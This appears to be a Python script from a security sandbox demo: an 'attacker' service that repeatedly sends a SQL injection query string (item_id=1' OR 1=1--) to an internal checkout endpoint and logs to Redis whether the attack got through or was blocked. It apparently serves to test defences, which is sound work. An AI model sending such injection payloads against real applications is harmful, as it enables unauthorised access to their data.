import time
import requests
import logging
import socket
import redis
import json
import os

r = redis.from_url(os.getenv("REDIS_URL", "redis://redis:6379"))

def pub_log(level: str, msg: str):
    try:
        r.publish("sandbox.logs", json.dumps({
            "source": "attacker",
            "level": level,
            "message": msg
        }))
    except:
        pass

# Get local IP for logging context
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [ATTACKER] - %(message)s")
logger = logging.getLogger(__name__)

TARGET_URL = "http://sandbox:8000/checkout?item_id=1' OR 1=1--"

def start_attack():
    msg = f"Attacker ({local_ip}) starting payload delivery to {TARGET_URL}"
    logger.info(msg)
    pub_log("info", msg)
    while True:
        try:
            response = requests.get(TARGET_URL, timeout=5)
            if response.status_code == 200:
                msg = "🔴 ATTACK SUCCESS: Target vulnerable, extracted data."
                logger.error(msg)
                pub_log("error", msg)
            elif response.status_code == 403:
                msg = "🟢 ATTACK BLOCKED: Target firewall rejected connection."
                logger.info(msg)
                pub_log("success", msg)
            else:
                logger.warning(f"Unexpected status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            msg = "🟢 ATTACK BLOCKED: Connection completely dropped / Timeout."
            logger.info(msg)
            pub_log("success", msg)
        
        # Attack interval
        time.sleep(3)

if __name__ == "__main__":
    start_attack()
